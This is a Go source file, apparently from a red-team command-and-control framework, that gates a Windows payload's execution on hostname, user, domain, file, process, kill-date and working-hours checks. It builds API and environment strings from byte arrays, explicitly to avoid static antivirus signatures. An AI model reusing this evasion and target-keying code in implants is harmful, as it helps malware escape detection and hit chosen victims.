// server/docker/payloads/Windows/exec_requirements_windows.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/shirou/gopsutil/v4/process"
	"golang.org/x/sys/windows"
)

// Build-time variables that will be set via ldflags
var (
	// Safety check variables - set at build time
	safetyHostname       string = ""
	safetyUsername       string = ""
	safetyDomain         string = ""
	safetyFilePath       string = ""
	safetyFileMustExist  string = "false"
	safetyProcess        string = ""
	safetyKillDate       string = ""
	safetyWorkHoursStart string = ""
	safetyWorkHoursEnd   string = ""
)

// Exec requirements strings (constructed to avoid static signatures)
var (
	// DLL names
	erDllNetapi32 = string([]byte{0x6e, 0x65, 0x74, 0x61, 0x70, 0x69, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                                                 // netapi32.dll
	erDllSecur32  = string([]byte{0x73, 0x65, 0x63, 0x75, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                                                       // secur32.dll

	// Proc names
	erProcNetGetJoinInfo = string([]byte{0x4e, 0x65, 0x74, 0x47, 0x65, 0x74, 0x4a, 0x6f, 0x69, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e}) // NetGetJoinInformation
	erProcNetApiBufFree  = string([]byte{0x4e, 0x65, 0x74, 0x41, 0x70, 0x69, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72, 0x46, 0x72, 0x65, 0x65})                               // NetApiBufferFree
	erProcGetUserNameEx  = string([]byte{0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x4e, 0x61, 0x6d, 0x65, 0x45, 0x78, 0x57})                                           // GetUserNameExW

	// Environment variable names
	erEnvUsername    = string([]byte{0x55, 0x53, 0x45, 0x52, 0x4e, 0x41, 0x4d, 0x45})                                     // USERNAME
	erEnvUserDnsDom  = string([]byte{0x55, 0x53, 0x45, 0x52, 0x44, 0x4e, 0x53, 0x44, 0x4f, 0x4d, 0x41, 0x49, 0x4e})       // USERDNSDOMAIN
	erEnvUserDomain  = string([]byte{0x55, 0x53, 0x45, 0x52, 0x44, 0x4f, 0x4d, 0x41, 0x49, 0x4e})                         // USERDOMAIN
	erEnvLogonServer = string([]byte{0x4c, 0x4f, 0x47, 0x4f, 0x4e, 0x53, 0x45, 0x52, 0x56, 0x45, 0x52})                   // LOGONSERVER
	erEnvUserProfile = string([]byte{0x55, 0x53, 0x45, 0x52, 0x50, 0x52, 0x4f, 0x46, 0x49, 0x4c, 0x45})                   // USERPROFILE

	// String literals
	erWordTrue       = string([]byte{0x74, 0x72, 0x75, 0x65})                                                             // true
	erWordExe        = string([]byte{0x2e, 0x65, 0x78, 0x65})                                                             // .exe
	erPathTildeBack  = string([]byte{0x7e, 0x5c})                                                                         // ~\
	erPathTildeFwd   = string([]byte{0x7e, 0x2f})                                                                         // ~/
	erDoubleBacksl   = string([]byte{0x5c, 0x5c})                                                                         // \\

	// Time format strings
	erTimeFmtFull  = string([]byte{0x32, 0x30, 0x30, 0x36, 0x2d, 0x30, 0x31, 0x2d, 0x30, 0x32, 0x20, 0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35}) // 2006-01-02 15:04:05
	erTimeFmtDate  = string([]byte{0x32, 0x30, 0x30, 0x36, 0x2d, 0x30, 0x31, 0x2d, 0x30, 0x32})                                                       // 2006-01-02
)

// Windows API constants
const (
	NetSetupUnknownStatus = iota
	NetSetupUnjoined
	NetSetupWorkgroupName
	NetSetupDomainName
)

var (
	modNetapi32               = windows.NewLazySystemDLL(erDllNetapi32)
	modSecur32                = windows.NewLazySystemDLL(erDllSecur32)
	procNetGetJoinInformation = modNetapi32.NewProc(erProcNetGetJoinInfo)
	procNetApiBufferFree      = modNetapi32.NewProc(erProcNetApiBufFree)
	procGetUserNameExW        = modSecur32.NewProc(erProcGetUserNameEx)
)

// NameFormat constants for GetUserNameEx
const (
	NameUnknown          = 0
	NameFullyQualifiedDN = 1
	NameSamCompatible    = 2
	NameDisplay          = 3
	NameUniqueId         = 6
	NameCanonical        = 7
	NameUserPrincipal    = 8
	NameCanonicalEx      = 9
	NameServicePrincipal = 10
	NameDnsDomain        = 12
)

// PerformSafetyChecks runs all configured safety checks
// Returns true if all checks pass, false otherwise
func PerformSafetyChecks() bool {
	// If no safety checks are configured, allow execution
	if !hasSafetyChecks() {
		return true
	}

	// Check hostname
	if safetyHostname != "" {
		if !checkHostname(safetyHostname) {
			return false
		}
	}

	// Check username
	if safetyUsername != "" {
		if !checkUsername(safetyUsername) {
			return false
		}
	}

	// Check domain
	if safetyDomain != "" {
		if !checkDomain(safetyDomain) {
			return false
		}
	}

	// Check file existence
	if safetyFilePath != "" {
		mustExist := safetyFileMustExist == erWordTrue
		if !checkFile(safetyFilePath, mustExist) {
			return false
		}
	}

	// Check process
	if safetyProcess != "" {
		if !checkProcess(safetyProcess) {
			return false
		}
	}

	// Check kill date
	if safetyKillDate != "" {
		if !checkKillDate(safetyKillDate) {
			return false
		}
	}

	// Check working hours
	if safetyWorkHoursStart != "" && safetyWorkHoursEnd != "" {
		if !checkWorkingHours(safetyWorkHoursStart, safetyWorkHoursEnd) {
			return false
		}
	}

	return true
}

// hasSafetyChecks returns true if any safety checks are configured
func hasSafetyChecks() bool {
	return safetyHostname != "" ||
		safetyUsername != "" ||
		safetyDomain != "" ||
		safetyFilePath != "" ||
		safetyProcess != "" ||
		safetyKillDate != "" ||
		(safetyWorkHoursStart != "" && safetyWorkHoursEnd != "")
}

// checkHostname verifies the system hostname matches the expected value
func checkHostname(expected string) bool {
	hostname, err := os.Hostname()
	if err != nil {
		return false
	}
	return strings.EqualFold(hostname, expected)
}

// checkUsername verifies the current username matches the expected value
func checkUsername(expected string) bool {
	// Method 1: Use Windows API GetUserNameExW for SAM compatible name
	if username := getUserNameEx(NameSamCompatible); username != "" {
		// SAM format is DOMAIN\Username, extract just username
		if idx := strings.LastIndex(username, "\\"); idx >= 0 {
			username = username[idx+1:]
		}
		if strings.EqualFold(username, expected) {
			return true
		}
	}

	// Method 2: Environment variable fallback
	username := os.Getenv(erEnvUsername)
	if username != "" && strings.EqualFold(username, expected) {
		return true
	}

	return false
}

// getUserNameEx calls the Windows GetUserNameExW API
func getUserNameEx(nameFormat int) string {
	var size uint32 = 256
	buf := make([]uint16, size)

	ret, _, _ := procGetUserNameExW.Call(
		uintptr(nameFormat),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)),
	)

	if ret == 0 {
		return ""
	}

	return syscall.UTF16ToString(buf[:size])
}

// checkDomain checks if the machine is joined to the specified Active Directory domain
func checkDomain(expected string) bool {
	// Method 1: Use NetGetJoinInformation API (most reliable)
	if domain := getJoinedDomain(); domain != "" {
		if strings.EqualFold(domain, expected) {
			return true
		}
		// Also check if the expected is a substring (e.g., "CORP" matches "CORP.EXAMPLE.COM")
		if strings.Contains(strings.ToUpper(domain), strings.ToUpper(expected)) {
			return true
		}
	}

	// Method 2: Check USERDNSDOMAIN environment variable (set for domain users)
	if dnsDomain := os.Getenv(erEnvUserDnsDom); dnsDomain != "" {
		if strings.EqualFold(dnsDomain, expected) {
			return true
		}
		if strings.Contains(strings.ToUpper(dnsDomain), strings.ToUpper(expected)) {
			return true
		}
	}

	// Method 3: Check USERDOMAIN environment variable (NetBIOS domain name)
	if userDomain := os.Getenv(erEnvUserDomain); userDomain != "" {
		if strings.EqualFold(userDomain, expected) {
			return true
		}
	}

	// Method 4: Check LOGONSERVER (indicates domain controller)
	if logonServer := os.Getenv(erEnvLogonServer); logonServer != "" {
		// LOGONSERVER format is \\SERVERNAME
		// If it's set and not the local machine, likely domain-joined
		hostname, _ := os.Hostname()
		serverName := strings.TrimPrefix(logonServer, erDoubleBacksl)
		if !strings.EqualFold(serverName, hostname) {
			// Machine is using a domain controller, check other indicators
			if userDomain := os.Getenv(erEnvUserDomain); userDomain != "" {
				if strings.EqualFold(userDomain, expected) {
					return true
				}
			}
		}
	}

	return false
}

// getJoinedDomain uses NetGetJoinInformation to get the domain name
func getJoinedDomain() string {
	var nameBuffer *uint16
	var joinStatus uint32

	ret, _, _ := procNetGetJoinInformation.Call(
		0, // Local computer
		uintptr(unsafe.Pointer(&nameBuffer)),
		uintptr(unsafe.Pointer(&joinStatus)),
	)

	if ret != 0 {
		return ""
	}

	defer procNetApiBufferFree.Call(uintptr(unsafe.Pointer(nameBuffer)))

	// Only return domain name if actually joined to a domain
	if joinStatus != NetSetupDomainName {
		return ""
	}

	// Convert UTF16 pointer to Go string
	return windows.UTF16PtrToString(nameBuffer)
}

// checkFile verifies file existence based on the requirement
func checkFile(path string, mustExist bool) bool {
	// Expand environment variables in path
	path = os.ExpandEnv(path)

	// Expand ~ to user profile directory
	if strings.HasPrefix(path, erPathTildeBack) || strings.HasPrefix(path, erPathTildeFwd) {
		if home := os.Getenv(erEnvUserProfile); home != "" {
			path = filepath.Join(home, path[2:])
		}
	}

	_, err := os.Stat(path)

	if mustExist {
		return err == nil
	} else {
		return os.IsNotExist(err)
	}
}

// checkProcess checks if a specific process is running using Windows APIs
func checkProcess(processName string) bool {
	// Normalize the process name (remove .exe if present for comparison)
	searchName := strings.TrimSuffix(strings.ToLower(processName), erWordExe)

	// Use gopsutil which properly uses Windows APIs internally
	processes, err := process.Processes()
	if err != nil {
		return false
	}

	for _, p := range processes {
		name, err := p.Name()
		if err != nil {
			continue
		}

		// Normalize the found process name
		foundName := strings.TrimSuffix(strings.ToLower(name), erWordExe)

		// Exact match
		if foundName == searchName {
			return true
		}

		// Partial match for things like "chrome" matching "chrome.exe"
		if strings.Contains(foundName, searchName) {
			return true
		}
	}

	return false
}

// checkKillDate verifies the current date is before the kill date
func checkKillDate(killDateStr string) bool {
	// Parse kill date (format: "2006-01-02 15:04:05")
	killDate, err := time.Parse(erTimeFmtFull, killDateStr)
	if err != nil {
		// Try alternate format without time
		killDate, err = time.Parse(erTimeFmtDate, killDateStr)
		if err != nil {
			return false
		}
	}

	return time.Now().Before(killDate)
}

// checkWorkingHours verifies the current time is within working hours
func checkWorkingHours(startTime, endTime string) bool {
	now := time.Now()

	// Parse start time (format: "HH:MM")
	startParts := strings.Split(startTime, ":")
	if len(startParts) != 2 {
		return false
	}

	var startHour, startMin int
	fmt.Sscanf(startParts[0], "%d", &startHour)
	fmt.Sscanf(startParts[1], "%d", &startMin)

	// Parse end time
	endParts := strings.Split(endTime, ":")
	if len(endParts) != 2 {
		return false
	}

	var endHour, endMin int
	fmt.Sscanf(endParts[0], "%d", &endHour)
	fmt.Sscanf(endParts[1], "%d", &endMin)

	// Create time objects for today with specified hours
	startToday := time.Date(now.Year(), now.Month(), now.Day(), startHour, startMin, 0, 0, now.Location())
	endToday := time.Date(now.Year(), now.Month(), now.Day(), endHour, endMin, 0, 0, now.Location())

	return now.After(startToday) && now.Before(endToday)
}
